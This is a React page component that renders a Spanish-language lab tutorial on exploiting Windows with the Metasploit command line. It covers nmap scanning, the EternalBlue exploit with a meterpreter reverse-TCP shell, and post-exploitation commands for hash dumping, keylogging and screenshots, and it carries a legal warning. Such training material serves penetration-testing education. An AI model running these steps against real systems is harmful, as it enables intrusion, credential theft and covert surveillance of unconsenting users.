import React from 'react';
import Image from 'next/image';

export default function MetasploitLab() {
  return (
    <div className="container py-8 px-4 mx-auto max-w-4xl">
      {/* Encabezado */}
      <h1 className="text-3xl md:text-4xl font-bold mb-6 text-center">
        Explotación de Vulnerabilidades en Windows con Metasploit Framework (CLI)
      </h1>

      {/* Objetivo Principal */}
      <div className="bg-card rounded-lg p-6 mb-8 shadow-lg">
        <h2 className="text-2xl font-semibold mb-4">Objetivo Principal</h2>        <p className="text-muted-foreground text-justify">
          Demostrar el proceso de identificación y explotación de vulnerabilidades en un sistema Windows
          utilizando la interfaz de línea de comandos (CLI) del Metasploit Framework. Este laboratorio
          proporciona una comprensión profunda del funcionamiento interno de Metasploit y la metodología
          de pentesting profesional.
        </p>
      </div>

      {/* Descripción del Laboratorio */}
      <div className="mb-8">
        <h2 className="text-2xl font-semibold mb-4">Descripción del Laboratorio</h2>        <p className="text-muted-foreground mb-4 text-justify">
          Este laboratorio detalla los pasos necesarios para utilizar el Metasploit Framework directamente
          desde la línea de comandos en Kali Linux. A diferencia del enfoque gráfico de Armitage, este
          laboratorio se centra en comprender los comandos y la arquitectura fundamental de Metasploit,
          proporcionando una base sólida para el pentesting avanzado.
        </p>
      </div>

      {/* Pasos Detallados */}
      <div className="space-y-12">
        {/* Paso 1: Inicio de Metasploit */}
        <div>
          <h2 className="text-2xl font-semibold mb-4">1. Inicio de Metasploit Console</h2>
          <p className="text-muted-foreground mb-4">
            El primer paso es inicializar la base de datos y arrancar la consola de Metasploit:
          </p>
          <div className="bg-muted p-4 rounded-md mb-4 overflow-x-auto">
            <pre className="text-sm">
              <code>
                sudo systemctl start postgresql{'\n'}
                sudo msfdb init{'\n'}
                msfconsole
              </code>
            </pre>
          </div>
          <Image
            src="/lab1/metasploit/1.png"
            alt="Consola de Metasploit"
            width={800}
            height={450}
            className="rounded-lg shadow-md mb-4"
          />
        </div>

        {/* Paso 2: Escaneo de Vulnerabilidades */}
        <div>
          <h2 className="text-2xl font-semibold mb-4">2. Escaneo de Vulnerabilidades</h2>
          <p className="text-muted-foreground mb-4">
            Utilizamos el módulo integrado db_nmap para realizar el escaneo inicial:
          </p>
          <div className="bg-muted p-4 rounded-md mb-4">
            <pre className="text-sm">
              <code>
                # Escaneo básico de servicios{'\n'}
                db_nmap -sV [IP_OBJETIVO]{'\n\n'}
                # Escaneo más detallado{'\n'}
                db_nmap -sV -p- --script vuln [IP_OBJETIVO]
              </code>
            </pre>
          </div>
        </div>

        {/* Paso 3: Búsqueda y Selección de Exploits */}
        <div>
          <h2 className="text-2xl font-semibold mb-4">3. Búsqueda y Selección de Exploits</h2>
          <p className="text-muted-foreground mb-4">
            Una vez identificados los servicios vulnerables, procedemos a buscar y seleccionar los exploits apropiados:
          </p>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-muted p-4 rounded-md">
              <h3 className="font-semibold mb-2">Búsqueda de Exploits</h3>
              <pre className="text-sm">
                <code>
                  search type:exploit platform:windows{'\n'}
                  search ms17_010{'\n'}
                  info [EXPLOIT_PATH]
                </code>
              </pre>
            </div>
            <div className="bg-muted p-4 rounded-md">
              <h3 className="font-semibold mb-2">Selección de Exploit</h3>
              <pre className="text-sm">
                <code>
                  use exploit/windows/smb/ms17_010_eternalblue{'\n'}
                  show options{'\n'}
                  show payloads
                </code>
              </pre>
            </div>
          </div>
        </div>

        {/* Paso 4: Configuración y Explotación */}
        <div>
          <h2 className="text-2xl font-semibold mb-4">4. Configuración y Explotación</h2>
          <p className="text-muted-foreground mb-4">
            Configuramos los parámetros necesarios y ejecutamos el exploit:
          </p>
          <div className="bg-muted p-4 rounded-md mb-4">
            <pre className="text-sm">
              <code>
                set RHOSTS [IP_OBJETIVO]{'\n'}
                set LHOST [TU_IP]{'\n'}
                set payload windows/x64/meterpreter/reverse_tcp{'\n'}
                exploit
              </code>
            </pre>
          </div>
        </div>

        {/* Paso 5: Post-Explotación */}
        <div>
          <h2 className="text-2xl font-semibold mb-4">5. Post-Explotación con Meterpreter</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <h3 className="text-xl font-semibold mb-4">Comandos Básicos</h3>
              <div className="bg-muted p-4 rounded-md">
                <pre className="text-sm">
                  <code>
                    sysinfo      # Info del sistema{'\n'}
                    getuid       # Usuario actual{'\n'}
                    pwd          # Directorio actual{'\n'}
                    ps           # Listar procesos{'\n'}
                    shell        # Obtener shell
                  </code>
                </pre>
              </div>
            </div>
            <div>
              <h3 className="text-xl font-semibold mb-4">Comandos Avanzados</h3>
              <div className="bg-muted p-4 rounded-md">
                <pre className="text-sm">
                  <code>
                    hashdump     # Extraer hashes{'\n'}
                    screenshot   # Captura de pantalla{'\n'}
                    keyscan_start # Keylogger{'\n'}
                    migrate      # Migrar proceso{'\n'}
                    run post/windows/gather/hashdump
                  </code>
                </pre>
              </div>
            </div>
          </div>
        </div>

        {/* Tips y Mejores Prácticas */}
        <div className="mb-8">
          <h2 className="text-2xl font-semibold mb-4">Tips y Mejores Prácticas</h2>
          <div className="bg-card p-6 rounded-lg">
            <ul className="list-disc pl-6 space-y-2 text-muted-foreground">
              <li>Siempre verifica que tienes permiso explícito antes de realizar cualquier escaneo o explotación.</li>
              <li>Utiliza <code>sessions -i [ID]</code> para cambiar entre diferentes sesiones activas.</li>
              <li>Ejecuta <code>background</code> para poner una sesión en segundo plano.</li>
              <li>Usa <code>migrate</code> para mover el payload a un proceso más estable.</li>
              <li>Documenta todos los pasos y hallazgos para análisis posterior.</li>
            </ul>
          </div>
        </div>

        {/* Aviso Legal */}
        <div className="bg-destructive/10 p-6 rounded-lg mt-8">
          <h4 className="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso Legal Importante</h4>
          <p className="text-muted-foreground">
            Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
            La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
            es puramente educativo para comprender el funcionamiento interno de Metasploit y mejorar las
            defensas de los sistemas.
          </p>
        </div>
      </div>
    </div>
  );
}
